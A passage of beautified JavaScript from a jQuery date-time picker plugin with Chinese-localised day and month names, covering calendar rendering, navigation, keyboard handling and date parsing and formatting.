            this.forceParse && (this.isInput && this.element.val() || this.hasInput && this.element.find("input").val()) && this.setValue(),
            this.isVisible = !1,
            this.element.trigger({
                type: "hide",
                date: this.date
            }))
        },
        remove: function() {
            this._detachEvents(),
            this.picker.remove(),
            delete this.picker,
            delete this.element.data().datetimepicker
        },
        getDate: function() {
            var e = this.getUTCDate();
            return new Date(e.getTime() + 6e4 * e.getTimezoneOffset())
        },
        getUTCDate: function() {
            return this.date
        },
        setDate: function(e) {
            this.setUTCDate(new Date(e.getTime() - 6e4 * e.getTimezoneOffset()))
        },
        setUTCDate: function(e) {
            e >= this.startDate && e <= this.endDate ? (this.date = e,
            this.setValue(),
            this.viewDate = this.date,
            this.fill()) : this.element.trigger({
                type: "outOfRange",
                date: e,
                startDate: this.startDate,
                endDate: this.endDate
            })
        },
        setFormat: function(e) {
            var t;
            this.format = j.parseFormat(e, this.formatType),
            this.isInput ? t = this.element : this.component && (t = this.element.find("input")),
            t && t.val() && this.setValue()
        },
        setValue: function() {
            var e = this.getFormattedDate();
            this.isInput ? this.element.val(e) : (this.component && this.element.find("input").val(e),
            this.element.data("date", e)),
            this.linkField && S("#" + this.linkField).val(this.getFormattedDate(this.linkFormat))
        },
        getFormattedDate: function(e) {
            return null == e && (e = this.format),
            j.formatDate(this.date, e, this.language, this.formatType)
        },
        setStartDate: function(e) {
            this.startDate = e || -1 / 0,
            this.startDate !== -1 / 0 && (this.startDate = j.parseDate(this.startDate, this.format, this.language, this.formatType)),
            this.update(),
            this.updateNavArrows()
        },
        setEndDate: function(e) {
            this.endDate = e || 1 / 0,
            this.endDate !== 1 / 0 && (this.endDate = j.parseDate(this.endDate, this.format, this.language, this.formatType)),
            this.update(),
            this.updateNavArrows()
        },
        setDaysOfWeekDisabled: function(e) {
            this.daysOfWeekDisabled = e || [],
            S.isArray(this.daysOfWeekDisabled) || (this.daysOfWeekDisabled = this.daysOfWeekDisabled.split(/,\s*/)),
            this.daysOfWeekDisabled = S.map(this.daysOfWeekDisabled, function(e) {
                return parseInt(e, 10)
            }),
            this.update(),
            this.updateNavArrows()
        },
        place: function() {
            var t, e, i, n, a;
            this.isInline || (t = 0,
            S("div").each(function() {
                var e = parseInt(S(this).css("zIndex"), 10);
                t < e && (t = e)
            }),
            e = t + 10,
            a = (this.container instanceof S ? this.container : S(this.container)).offset(),
            this.component ? (n = (i = this.component.offset()).left,
            "bottom-left" != this.pickerPosition && "top-left" != this.pickerPosition || (n += this.component.outerWidth() - this.picker.outerWidth())) : n = (i = this.element.offset()).left,
            n + 220 > document.body.clientWidth && (n = document.body.clientWidth - 220),
            i = "top-left" == this.pickerPosition || "top-right" == this.pickerPosition ? i.top - this.picker.outerHeight() : i.top + this.height,
            i -= a.top,
            n -= a.left,
            this.picker.css({
                top: i,
                left: n,
                zIndex: e
            }))
        },
        update: function() {
            var e, t = !1;
            arguments && arguments.length && ("string" == typeof arguments[0] || arguments[0]instanceof Date) ? (e = arguments[0],
            t = !0) : ("string" == typeof (e = (this.isInput ? this.element : this.element.find("input")).val() || this.element.data("date") || this.initialDate) || e instanceof String) && (e = e.replace(/^\s+|\s+$/g, "")),
            e || (e = new Date,
            t = !1),
            this.date = j.parseDate(e, this.format, this.language, this.formatType),
            t && this.setValue(),
            this.date < this.startDate ? this.viewDate = new Date(this.startDate) : this.date > this.endDate ? this.viewDate = new Date(this.endDate) : this.viewDate = new Date(this.date),
            this.fill()
        },
        fillDow: function() {
            for (var e = this.weekStart, t = "<tr>"; e < this.weekStart + 7; )
                t += '<th class="dow">' + E[this.language].daysMin[e++ % 7] + "</th>";
            t += "</tr>",
            this.picker.find(".datetimepicker-days thead").append(t)
        },
        fillMonths: function() {
            for (var e = "", t = 0; t < 12; )
                e += '<span class="month">' + E[this.language].monthsShort[t++] + "</span>";
            this.picker.find(".datetimepicker-months td").html(e)
        },
        fill: function() {
            if (null != this.date && null != this.viewDate) {
                for (var e = new Date(this.viewDate), t = e.getUTCFullYear(), i = e.getUTCMonth(), n = e.getUTCDate(), a = e.getUTCHours(), o = e.getUTCMinutes(), s = this.startDate !== -1 / 0 ? this.startDate.getUTCFullYear() : -1 / 0, e = this.startDate !== -1 / 0 ? this.startDate.getUTCMonth() : -1 / 0, r = this.endDate !== 1 / 0 ? this.endDate.getUTCFullYear() : 1 / 0, c = this.endDate !== 1 / 0 ? this.endDate.getUTCMonth() : 1 / 0, l = new D(this.date.getUTCFullYear(),this.date.getUTCMonth(),this.date.getUTCDate()).valueOf(), d = new Date, p = (this.picker.find(".datetimepicker-days thead th:eq(1)").text(E[this.language].months[i] + " " + t),
                "time" == this.formatViewType ? (u = ((u = a % 12 || 12) < 10 ? "0" : "") + u,
                C = (o < 10 ? "0" : "") + o,
                T = E[this.language].meridiem[a < 12 ? 0 : 1],
                this.picker.find(".datetimepicker-hours thead th:eq(1)").text(u + ":" + C + " " + (T ? T.toUpperCase() : "")),
                this.picker.find(".datetimepicker-minutes thead th:eq(1)").text(u + ":" + C + " " + (T ? T.toUpperCase() : ""))) : (this.picker.find(".datetimepicker-hours thead th:eq(1)").text(n + " " + E[this.language].months[i] + " " + t),
                this.picker.find(".datetimepicker-minutes thead th:eq(1)").text(n + " " + E[this.language].months[i] + " " + t)),
                this.picker.find("tfoot th.today").html('<div class="today-btn">' + E[this.language].today + "</div>").toggle(!1 !== this.todayBtn),
                this.fillMonths(),
                D(t, i - 1, 28, 0, 0, 0, 0)), u = j.getDaysInMonth(p.getUTCFullYear(), p.getUTCMonth()), h = (p.setUTCDate(u),
                p.setUTCDate(u - (p.getUTCDay() - this.weekStart + 7) % 7),
                new Date(p)), f = (h.setUTCDate(h.getUTCDate() + 42),
                h = h.valueOf(),
                []), m = ""; p.valueOf() < h; ) {
                    var g, v = "";
                    p.getUTCDay() == this.weekStart && f.push("<tr>"),
                    $ = "",
                    m = p.getUTCDate(),
                    p.getUTCFullYear() < t || p.getUTCFullYear() == t && p.getUTCMonth() < i ? $ += " old" : (p.getUTCFullYear() > t || p.getUTCFullYear() == t && p.getUTCMonth() > i) && ($ += " new"),
                    this.todayHighlight && p.getUTCFullYear() == d.getFullYear() && p.getUTCMonth() == d.getMonth() && m == d.getDate() && ($ += " today",
                    m = "今日"),
                    p.valueOf() == l && ($ += " active"),
                    p.valueOf() + 864e5 <= this.startDate || p.valueOf() > this.endDate || -1 !== S.inArray(p.getUTCDay(), this.daysOfWeekDisabled) ? $ += " disabled" : (g = "" + p.getUTCFullYear() + p.getUTCMonth() + p.getUTCDate(),
                    this.inDate.filter(function(e) {
                        return "" + e.year + e.month + e.day == g
                    }).length && (v = '<i class="indate-dot"></i>')),
                    f.push('<td class="day' + $ + '"><em>' + p.getUTCDate() + "</em>" + v + "</td>"),
                    p.getUTCDay() == this.weekEnd && f.push("</tr>"),
                    p.setUTCDate(p.getUTCDate() + 1)
                }
                this.picker.find(".datetimepicker-days tbody").empty().append(f.join(""));
                for (var f = [], w = "", b = "", y = 0; y < 24; y++) {
                    var $ = "";
                    (x = D(t, i, n, y)).valueOf() + 36e5 <= this.startDate || x.valueOf() > this.endDate ? $ += " disabled" : a == y && ($ += " active"),
                    this.showMeridian && 2 == E[this.language].meridiem.length ? ((w = y < 12 ? E[this.language].meridiem[0] : E[this.language].meridiem[1]) != b && ("" != b && f.push("</fieldset>"),
                    f.push('<fieldset class="hour"><legend>' + w.toUpperCase() + "</legend>")),
                    b = w,
                    f.push('<span class="hour' + $ + " hour_" + (y < 12 ? "am" : "pm") + '">' + (y % 12 || 12) + "</span>"),
                    23 == y && f.push("</fieldset>")) : f.push('<span class="hour' + $ + '">' + (y + ":00") + "</span>")
                }
                this.picker.find(".datetimepicker-hours td").html(f.join("")),
                f = [];
                for (var x, w = "", b = "", y = 0; y < 60; y += this.minuteStep)
                    $ = "",
                    (x = D(t, i, n, a, y, 0)).valueOf() < this.startDate || x.valueOf() > this.endDate ? $ += " disabled" : Math.floor(o / this.minuteStep) == Math.floor(y / this.minuteStep) && ($ += " active"),
                    this.showMeridian && 2 == E[this.language].meridiem.length ? ((w = a < 12 ? E[this.language].meridiem[0] : E[this.language].meridiem[1]) != b && ("" != b && f.push("</fieldset>"),
                    f.push('<fieldset class="minute"><legend>' + w.toUpperCase() + "</legend>")),
                    b = w,
                    f.push('<span class="minute' + $ + '">' + (a % 12 || 12) + ":" + (y < 10 ? "0" + y : y) + "</span>"),
                    59 == y && f.push("</fieldset>")) : f.push('<span class="minute' + $ + '">' + a + ":" + (y < 10 ? "0" + y : y) + "</span>");
                this.picker.find(".datetimepicker-minutes td").html(f.join(""));
                var k = this.date.getUTCFullYear()
                  , C = this.picker.find(".datetimepicker-months").find("th:eq(1)").text(t).end().find("span").removeClass("active")
                  , T = (k == t && C.eq(this.date.getUTCMonth()).addClass("active"),
                (t < s || r < t) && C.addClass("disabled"),
                t == s && C.slice(0, e).addClass("disabled"),
                t == r && C.slice(c + 1).addClass("disabled"),
                f = "",
                t = 10 * parseInt(t / 10, 10),
                this.picker.find(".datetimepicker-years").find("th:eq(1)").text(t + "-" + (t + 9)).end().find("td"));
                --t;
                for (y = -1; y < 11; y++) {
                    var _ = t;
                    if (this.minLimitYear && t < this.minLimitYear)
                        return;
                    f += '<span class="year' + (-1 == y || 10 == y ? " old" : "") + (k == t ? " active" : "") + (t < s || r < t ? " disabled" : "") + '" data-year="' + t + '">' + (_ = this.minLimitYear && t == this.minLimitYear ? t + 1 + "以前" : _) + "</span>",
                    t += 1
                }
                T.html(f),
                this.place(),
                this.updateNavArrows()
            }
        },
        updateNavArrows: function() {
            var e = new Date(this.viewDate)
              , t = e.getUTCFullYear()
              , i = e.getUTCMonth()
              , n = e.getUTCDate()
              , a = e.getUTCHours()
              , o = this.picker.find(".datetimepicker-years").find(".year").last().hasClass("disabled");
            switch (this.viewMode) {
            case 0:
                this.startDate !== -1 / 0 && t <= this.startDate.getUTCFullYear() && i <= this.startDate.getUTCMonth() && n <= this.startDate.getUTCDate() && a <= this.startDate.getUTCHours() ? this.picker.find(".prev").css({
                    visibility: "hidden"
                }) : this.picker.find(".prev").css({
                    visibility: "visible"
                }),
                this.endDate !== 1 / 0 && t >= this.endDate.getUTCFullYear() && i >= this.endDate.getUTCMonth() && n >= this.endDate.getUTCDate() && a >= this.endDate.getUTCHours() ? this.picker.find(".next").css({
                    visibility: "hidden"
                }) : this.picker.find(".next").css({
                    visibility: "visible"
                });
                break;
            case 1:
                this.startDate !== -1 / 0 && t <= this.startDate.getUTCFullYear() && i <= this.startDate.getUTCMonth() && n <= this.startDate.getUTCDate() ? this.picker.find(".prev").css({
                    visibility: "hidden"
                }) : this.picker.find(".prev").css({
                    visibility: "visible"
                }),
                this.endDate !== 1 / 0 && t >= this.endDate.getUTCFullYear() && i >= this.endDate.getUTCMonth() && n >= this.endDate.getUTCDate() ? this.picker.find(".next").css({
                    visibility: "hidden"
                }) : this.picker.find(".next").css({
                    visibility: "visible"
                });
                break;
            case 2:
                this.startDate !== -1 / 0 && t <= this.startDate.getUTCFullYear() && i <= this.startDate.getUTCMonth() ? this.picker.find(".prev").css({
                    visibility: "hidden"
                }) : this.picker.find(".prev").css({
                    visibility: "visible"
                }),
                this.endDate !== 1 / 0 && t >= this.endDate.getUTCFullYear() && i >= this.endDate.getUTCMonth() ? this.picker.find(".next").css({
                    visibility: "hidden"
                }) : this.picker.find(".next").css({
                    visibility: "visible"
                });
                break;
            case 3:
            case 4:
                this.startDate !== -1 / 0 && t <= this.startDate.getUTCFullYear() ? this.picker.find(".prev").css({
                    visibility: "hidden"
                }) : this.picker.find(".prev").css({
                    visibility: "visible"
                }),
                this.endDate !== 1 / 0 && t >= this.endDate.getUTCFullYear() || o ? this.picker.find(".next").css({
                    visibility: "hidden"
                }) : this.picker.find(".next").css({
                    visibility: "visible"
                })
            }
        },
        mousewheel: function(e) {
            e.preventDefault(),
            e.stopPropagation(),
            this.wheelPause || (this.wheelPause = !0,
            e = 0 < (e = e.originalEvent.wheelDelta) ? 1 : 0 === e ? 0 : -1,
            this.wheelViewModeNavigationInverseDirection && (e = -e),
            this.showMode(e),
            setTimeout(S.proxy(function() {
                this.wheelPause = !1
            }, this), this.wheelViewModeNavigationDelay))
        },
        click: function(e) {
            e.stopPropagation(),
            e.preventDefault();
            var t = S(e.target).closest("span, td, th, legend");
            if (1 == (t = t.is(".glyphicon") ? S(t).parent().closest("span, td, th, legend") : t).length)
                if (t.is(".disabled"))
                    this.element.trigger({
                        type: "outOfRange",
                        date: this.viewDate,
                        startDate: this.startDate,
                        endDate: this.endDate
                    });
                else
                    switch (t[0].nodeName.toLowerCase()) {
                    case "th":
                        switch (t[0].className) {
                        case "switch":
                            this.showMode(1);
                            break;
                        case "prev":
                        case "next":
                            this.picker.find(".prev").css({
                                visibility: "hidden"
                            }),
                            this.picker.find(".next").css({
                                visibility: "hidden"
                            }),
                            this.throttle(function() {
                                var e = j.modes[this.viewMode].navStep * ("prev" == t[0].className ? -1 : 1);
                                switch (this.viewMode) {
                                case 0:
                                    this.viewDate = this.moveHour(this.viewDate, e);
                                    break;
                                case 1:
                                    this.viewDate = this.moveDate(this.viewDate, e);
                                    break;
                                case 2:
                                    this.viewDate = this.moveMonth(this.viewDate, e);
                                    break;
                                case 3:
                                case 4:
                                    this.viewDate = this.moveYear(this.viewDate, e)
                                }
                                this.fill(),
                                this.element.trigger({
                                    type: t[0].className + ":" + this.convertViewModeText(this.viewMode),
                                    date: this.viewDate,
                                    startDate: this.startDate,
                                    endDate: this.endDate
                                })
                            }, 300);
                            break;
                        case "today":
                            var i = new Date;
                            (i = D(i.getFullYear(), i.getMonth(), i.getDate(), i.getHours(), i.getMinutes(), i.getSeconds(), 0)) < this.startDate ? i = this.startDate : i > this.endDate && (i = this.endDate),
                            this.viewMode = this.startViewMode,
                            this.showMode(0),
                            this._setDate(i),
                            this.fill(),
                            this.autoclose && this.hide()
                        }
                        break;
                    case "span":
                        t.is(".disabled") || (a = this.viewDate.getUTCFullYear(),
                        o = this.viewDate.getUTCMonth(),
                        n = this.viewDate.getUTCDate(),
                        s = this.viewDate.getUTCHours(),
                        r = this.viewDate.getUTCMinutes(),
                        c = this.viewDate.getUTCSeconds(),
                        t.is(".month") ? (this.viewDate.setUTCDate(1),
                        o = t.parent().find("span").index(t),
                        n = this.viewDate.getUTCDate(),
                        this.viewDate.setUTCMonth(o),
                        this.element.trigger({
                            type: "changeMonth",
                            date: this.viewDate
                        }),
                        3 <= this.viewSelect && this._setDate(D(a, o, n, s, r, c, 0))) : t.is(".year") ? (this.viewDate.setUTCDate(1),
                        a = parseInt(t.text(), 10) || 0,
                        -1 < t.text().indexOf("以前") && (a -= 1),
                        this.viewDate.setUTCFullYear(a),
                        this.element.trigger({
                            type: "changeYear",
                            date: this.viewDate
                        }),
                        4 <= this.viewSelect && this._setDate(D(a, o, n, s, r, c, 0)),
                        this.minLimitYear && this.minLimitYear == a && (this.viewMode = this.startViewMode,
                        this.showMode(0),
                        this._setDate(D(a, 0, n, s, r, c, 0)),
                        this.fill(),
                        this.hide())) : t.is(".hour") ? (s = parseInt(t.text(), 10) || 0,
                        (t.hasClass("hour_am") || t.hasClass("hour_pm")) && (12 == s && t.hasClass("hour_am") ? s = 0 : 12 != s && t.hasClass("hour_pm") && (s += 12)),
                        this.viewDate.setUTCHours(s),
                        this.element.trigger({
                            type: "changeHour",
                            date: this.viewDate
                        }),
                        1 <= this.viewSelect && this._setDate(D(a, o, n, s, r, c, 0))) : t.is(".minute") && (r = parseInt(t.text().substr(t.text().indexOf(":") + 1), 10) || 0,
                        this.viewDate.setUTCMinutes(r),
                        this.element.trigger({
                            type: "changeMinute",
                            date: this.viewDate
                        }),
                        0 <= this.viewSelect && this._setDate(D(a, o, n, s, r, c, 0))),
                        0 != this.viewMode ? (l = this.viewMode,
                        this.minLimitYear && this.minLimitYear == a ? this.showMode(0) : this.showMode(-1),
                        this.fill(),
                        l == this.viewMode && this.autoclose && this.hide()) : (this.fill(),
                        this.autoclose && this.hide()));
                        break;
                    case "td":
                        t.is(".day") && !t.is(".disabled") && (n = parseInt(t.text(), 10) || 1,
                        a = this.viewDate.getUTCFullYear(),
                        o = this.viewDate.getUTCMonth(),
                        s = this.viewDate.getUTCHours(),
                        r = this.viewDate.getUTCMinutes(),
                        c = this.viewDate.getUTCSeconds(),
                        t.is(".old") ? 0 === o ? (o = 11,
                        --a) : --o : t.is(".new") && (11 == o ? (o = 0,
                        a += 1) : o += 1),
                        this.viewDate.setUTCFullYear(a),
                        this.viewDate.setUTCMonth(o, n),
                        this.element.trigger({
                            type: "changeDay",
                            date: this.viewDate
                        }),
                        2 <= this.viewSelect && this._setDate(D(a, o, n, s, r, c, 0)));
                        var n, a, o, s, r, c, l = this.viewMode;
                        this.showMode(-1),
                        this.fill(),
                        l == this.viewMode && this.autoclose && this.hide()
                    }
        },
        throttle: function(e, t) {
            var i = this;
            clearTimeout(this.timer),
            this.timer = setTimeout(function() {
                e.call(i)
            }, t)
        },
        _setDate: function(e, t) {
            var i;
            t && "date" != t || (this.date = e),
            t && "view" != t || (this.viewDate = e),
            this.fill(),
            this.setValue(),
            this.isInput ? i = this.element : this.component && (i = this.element.find("input")),
            i && (i.change(),
            this.autoclose),
            this.element.trigger({
                type: "changeDate",
                date: this.date
            })
        },
        moveMinute: function(e, t) {
            if (!t)
                return e;
            e = new Date(e.valueOf());
            return e.setUTCMinutes(e.getUTCMinutes() + t * this.minuteStep),
            e
        },
        moveHour: function(e, t) {
            if (!t)
                return e;
            e = new Date(e.valueOf());
            return e.setUTCHours(e.getUTCHours() + t),
            e
        },
        moveDate: function(e, t) {
            if (!t)
                return e;
            e = new Date(e.valueOf());
            return e.setUTCDate(e.getUTCDate() + t),
            e
        },
        moveMonth: function(e, t) {
            if (!t)
                return e;
            var i, n, a = new Date(e.valueOf()), o = a.getUTCDate(), s = a.getUTCMonth(), r = Math.abs(t);
            if (t = 0 < t ? 1 : -1,
            1 == r)
                n = -1 == t ? function() {
                    return a.getUTCMonth() == s
                }
                : function() {
                    return a.getUTCMonth() != i
                }
                ,
                i = s + t,
                a.setUTCMonth(i),
                (i < 0 || 11 < i) && (i = (i + 12) % 12);
            else {
                for (var c = 0; c < r; c++)
                    a = this.moveMonth(a, t);
                i = a.getUTCMonth(),
                a.setUTCDate(o),
                n = function() {
                    return i != a.getUTCMonth()
                }
            }
            for (; n(); )
                a.setUTCDate(--o),
                a.setUTCMonth(i);
            return a
        },
        moveYear: function(e, t) {
            return this.moveMonth(e, 12 * t)
        },
        dateWithinRange: function(e) {
            return e >= this.startDate && e <= this.endDate
        },
        keydown: function(e) {
            if (this.picker.is(":not(:visible)"))
                27 == e.keyCode && this.show();
            else {
                var t, i, n, a, o = !1;
                switch (e.keyCode) {
                case 27:
                    this.hide(),
                    e.preventDefault();
                    break;
                case 37:
                case 39:
                    if (!this.keyboardNavigation)
                        break;
                    n = 37 == e.keyCode ? -1 : 1,
                    viewMode = this.viewMode,
                    e.ctrlKey ? viewMode += 2 : e.shiftKey && (viewMode += 1),
                    4 == viewMode ? (t = this.moveYear(this.date, n),
                    i = this.moveYear(this.viewDate, n)) : 3 == viewMode ? (t = this.moveMonth(this.date, n),
                    i = this.moveMonth(this.viewDate, n)) : 2 == viewMode ? (t = this.moveDate(this.date, n),
                    i = this.moveDate(this.viewDate, n)) : 1 == viewMode ? (t = this.moveHour(this.date, n),
                    i = this.moveHour(this.viewDate, n)) : 0 == viewMode && (t = this.moveMinute(this.date, n),
                    i = this.moveMinute(this.viewDate, n)),
                    this.dateWithinRange(t) && (this.date = t,
                    this.viewDate = i,
                    this.setValue(),
                    this.update(),
                    e.preventDefault(),
                    o = !0);
                    break;
                case 38:
                case 40:
                    if (!this.keyboardNavigation)
                        break;
                    n = 38 == e.keyCode ? -1 : 1,
                    viewMode = this.viewMode,
                    e.ctrlKey ? viewMode += 2 : e.shiftKey && (viewMode += 1),
                    4 == viewMode ? (t = this.moveYear(this.date, n),
                    i = this.moveYear(this.viewDate, n)) : 3 == viewMode ? (t = this.moveMonth(this.date, n),
                    i = this.moveMonth(this.viewDate, n)) : 2 == viewMode ? (t = this.moveDate(this.date, 7 * n),
                    i = this.moveDate(this.viewDate, 7 * n)) : 1 == viewMode ? i = this.showMeridian ? (t = this.moveHour(this.date, 6 * n),
                    this.moveHour(this.viewDate, 6 * n)) : (t = this.moveHour(this.date, 4 * n),
                    this.moveHour(this.viewDate, 4 * n)) : 0 == viewMode && (t = this.moveMinute(this.date, 4 * n),
                    i = this.moveMinute(this.viewDate, 4 * n)),
                    this.dateWithinRange(t) && (this.date = t,
                    this.viewDate = i,
                    this.setValue(),
                    this.update(),
                    e.preventDefault(),
                    o = !0);
                    break;
                case 13:
                    0 != this.viewMode ? (n = this.viewMode,
                    this.showMode(-1),
                    this.fill(),
                    n == this.viewMode && this.autoclose && this.hide()) : (this.fill(),
                    this.autoclose && this.hide()),
                    e.preventDefault();
                    break;
                case 9:
                    this.hide()
                }
                o && (this.isInput ? a = this.element : this.component && (a = this.element.find("input")),
                a && a.change(),
                this.element.trigger({
                    type: "changeDate",
                    date: this.date
                }))
            }
        },
        showMode: function(e) {
            e && (e = Math.max(0, Math.min(j.modes.length - 1, this.viewMode + e))) >= this.minView && e <= this.maxView && (this.element.trigger({
                type: "changeMode",
                date: this.viewDate,
                oldViewMode: this.viewMode,
                newViewMode: e
            }),
            this.viewMode = e),
            this.picker.find(">div").hide().filter(".datetimepicker-" + j.modes[this.viewMode].clsName).css("display", "block"),
            this.updateNavArrows()
        },
        reset: function(e) {
            this._setDate(null, "date")
        },
        convertViewModeText: function(e) {
            switch (e) {
            case 4:
                return "decade";
            case 3:
                return "year";
            case 2:
                return "month";
            case 1:
                return "day";
            case 0:
                return "hour"
            }
        }
    },
    S.fn.datetimepicker = function(n) {
        var a, o = Array.apply(null, arguments);
        return o.shift(),
        this.each(function() {
            var e = S(this)
              , t = e.data("datetimepicker")
              , i = "object" == typeof n && n;
            if (t || e.data("datetimepicker", t = new v(this,S.extend({}, S.fn.datetimepicker.defaults, i))),
            "string" == typeof n && "function" == typeof t[n] && void 0 !== (a = t[n].apply(t, o)))
                return !1
        }),
        void 0 !== a ? a : this
    }
    ,
    S.fn.datetimepicker.defaults = {},
    S.fn.datetimepicker.Constructor = v;
    var E = S.fn.datetimepicker.dates = {
        en: {
            days: ["星期日", "星期一", "星期二", "星期三", "星期四", "星期五", "星期六", "星期日"],
            daysShort: ["周日", "周一", "周二", "周三", "周四", "周五", "周六", "周日"],
            daysMin: ["日", "一", "二", "三", "四", "五", "六", "日"],
            months: ["一月", "二月", "三月", "四月", "五月", "六月", "七月", "八月", "九月", "十月", "十一月", "十二月"],
            monthsShort: ["一月", "二月", "三月", "四月", "五月", "六月", "七月", "八月", "九月", "十月", "十一月", "十二月"],
            today: "至今",
            suffix: [],
            meridiem: ["上午", "下午"]
        }
    }
      , j = {
        modes: [{
            clsName: "minutes",
            navFnc: "Hours",
            navStep: 1
        }, {
            clsName: "hours",
            navFnc: "Date",
            navStep: 1
        }, {
            clsName: "days",
            navFnc: "Month",
            navStep: 1
        }, {
            clsName: "months",
            navFnc: "FullYear",
            navStep: 1
        }, {
            clsName: "years",
            navFnc: "FullYear",
            navStep: 10
        }],
        isLeapYear: function(e) {
            return e % 4 == 0 && e % 100 != 0 || e % 400 == 0
        },
        getDaysInMonth: function(e, t) {
            return [31, j.isLeapYear(e) ? 29 : 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31][t]
        },
        getDefaultFormat: function(e, t) {
            if ("standard" == e)
                return "input" == t ? "yyyy-mm-dd hh:ii" : "yyyy-mm-dd hh:ii:ss";
            if ("php" == e)
                return "input" == t ? "Y-m-d H:i" : "Y-m-d H:i:s";
            throw new Error("Invalid format type.")
        },
        validParts: function(e) {
            if ("standard" == e)
                return /hh?|HH?|p|P|ii?|ss?|dd?|DD?|mm?|MM?|yy(?:yy)?/g;
            if ("php" == e)
                return /[dDjlNwzFmMnStyYaABgGhHis]/g;
            throw new Error("Invalid format type.")
        },
        nonpunctuation: /[^ -\/:-@\[-`{-~\t\n\rTZ]+/g,
        parseFormat: function(e, t) {
            var i = e.replace(this.validParts(t), "\0").split("\0")
              , e = e.match(this.validParts(t));
            if (i && i.length && e && 0 != e.length)
                return {
                    separators: i,
                    parts: e
                };
            throw new Error("Invalid date format.")
        },
        parseDate: function(e, t, i, n) {
            var a;
            if (e instanceof Date)
                return (a = new Date(e.valueOf() - 6e4 * e.getTimezoneOffset())).setMilliseconds(0),
                a;
            if (/^\d{4}\-\d{1,2}\-\d{1,2}$/.test(e) && (t = this.parseFormat("yyyy-mm-dd", n)),
            /^\d{4}\-\d{1,2}\-\d{1,2}[T ]\d{1,2}\:\d{1,2}$/.test(e) && (t = this.parseFormat("yyyy-mm-dd hh:ii", n)),
            /^\d{4}\-\d{1,2}\-\d{1,2}[T ]\d{1,2}\:\d{1,2}\:\d{1,2}[Z]{0,1}$/.test(e) && (t = this.parseFormat("yyyy-mm-dd hh:ii:ss", n)),
            /^[-+]\d+[dmwy]([\s,]+[-+]\d+[dmwy])*$/.test(e)) {
                var o, s = /([-+]\d+)([dmwy])/, r = e.match(/([-+]\d+)([dmwy])/g);
                e = new Date;
                for (var c = 0; c < r.length; c++)
                    switch (p = s.exec(r[c]),
                    o = parseInt(p[1]),
                    p[2]) {
                    case "d":
                        e.setUTCDate(e.getUTCDate() + o);
                        break;
                    case "m":
                        e = v.prototype.moveMonth.call(v.prototype, e, o);
                        break;
                    case "w":
                        e.setUTCDate(e.getUTCDate() + 7 * o);
                        break;
                    case "y":
                        e = v.prototype.moveYear.call(v.prototype, e, o)
                    }
                return D(e.getUTCFullYear(), e.getUTCMonth(), e.getUTCDate(), e.getUTCHours(), e.getUTCMinutes(), e.getUTCSeconds(), 0)
            }
            var l, d, p, r = e && e.match(this.nonpunctuation) || [], e = new Date(0,0,0,0,0,0,0), u = {}, h = ["hh", "h", "ii", "i", "ss", "s", "yyyy", "yy", "M", "MM", "m", "mm", "D", "DD", "d", "dd", "H", "HH", "p", "P"], f = {
                hh: function(e, t) {
                    return e.setUTCHours(t)
                },
                h: function(e, t) {
                    return e.setUTCHours(t)
                },
                HH: function(e, t) {
                    return e.setUTCHours(12 == t ? 0 : t)
                },
                H: function(e, t) {
                    return e.setUTCHours(12 == t ? 0 : t)
                },
                ii: function(e, t) {
                    return e.setUTCMinutes(t)
                },
                i: function(e, t) {
                    return e.setUTCMinutes(t)
                },
                ss: function(e, t) {
                    return e.setUTCSeconds(t)
                },
                s: function(e, t) {
                    return e.setUTCSeconds(t)
                },
                yyyy: function(e, t) {
                    return e.setUTCFullYear(t)
                },
                yy: function(e, t) {
                    return e.setUTCFullYear(2e3 + t)
                },
                m: function(e, t) {
                    for (--t; t < 0; )
                        t += 12;
                    for (e.setUTCMonth(t %= 12); e.getUTCMonth() != t; ) {
                        if (isNaN(e.getUTCMonth()))
                            return e;
                        e.setUTCDate(e.getUTCDate() - 1)
                    }
                    return e
                },
                d: function(e, t) {
                    return e.setUTCDate(t)
                },
                p: function(e, t) {
                    return e.setUTCHours(1 == t ? e.getUTCHours() + 12 : e.getUTCHours())
                }
            };
            if (f.M = f.MM = f.mm = f.m,
            f.dd = f.d,
            f.P = f.p,
            e = D(e.getFullYear(), e.getMonth(), e.getDate(), e.getHours(), e.getMinutes(), e.getSeconds()),
            r.length == t.parts.length) {
                for (var c = 0, m = t.parts.length; c < m; c++) {
                    if (l = parseInt(r[c], 10),
                    p = t.parts[c],
                    isNaN(l))
                        switch (p) {
                        case "MM":
                            d = S(E[i].months).filter(function() {
                                var e = this.slice(0, r[c].length);
                                return e == r[c].slice(0, e.length)
                            }),
                            l = S.inArray(d[0], E[i].months) + 1;
                            break;
                        case "M":
                            d = S(E[i].monthsShort).filter(function() {
                                var e = this.slice(0, r[c].length)
                                  , t = r[c].slice(0, e.length);
                                return e.toLowerCase() == t.toLowerCase()
                            }),
                            l = S.inArray(d[0], E[i].monthsShort) + 1;
                            break;
                        case "p":
                        case "P":
                            l = S.inArray(r[c].toLowerCase(), E[i].meridiem)
                        }
                    u[p] = l
                }
                for (var g, c = 0; c < h.length; c++)
                    (g = h[c])in u && !isNaN(u[g]) && f[g](e, u[g])
            }
            return e
        },
        formatDate: function(e, t, i, n) {
            if (null == e)
                return "";
            var a;
            if ("standard" == n)
                a = {
                    yy: e.getUTCFullYear().toString().substring(2),
                    yyyy: e.getUTCFullYear(),
                    m: e.getUTCMonth() + 1,
                    M: E[i].monthsShort[e.getUTCMonth()],
                    MM: E[i].months[e.getUTCMonth()],
                    d: e.getUTCDate(),
                    D: E[i].daysShort[e.getUTCDay()],
                    DD: E[i].days[e.getUTCDay()],
                    p: 2 == E[i].meridiem.length ? E[i].meridiem[e.getUTCHours() < 12 ? 0 : 1] : "",
                    h: e.getUTCHours(),
                    i: e.getUTCMinutes(),
                    s: e.getUTCSeconds()
                },
                2 == E[i].meridiem.length ? a.H = a.h % 12 == 0 ? 12 : a.h % 12 : a.H = a.h,
                a.HH = (a.H < 10 ? "0" : "") + a.H,
                a.P = a.p.toUpperCase(),
                a.hh = (a.h < 10 ? "0" : "") + a.h,
                a.ii = (a.i < 10 ? "0" : "") + a.i,
                a.ss = (a.s < 10 ? "0" : "") + a.s,
                a.dd = (a.d < 10 ? "0" : "") + a.d,
                a.mm = (a.m < 10 ? "0" : "") + a.m;
            else {
                if ("php" != n)
                    throw new Error("Invalid format type.");
                (a = {
                    y: e.getUTCFullYear().toString().substring(2),
                    Y: e.getUTCFullYear(),
                    F: E[i].months[e.getUTCMonth()],
                    M: E[i].monthsShort[e.getUTCMonth()],
                    n: e.getUTCMonth() + 1,
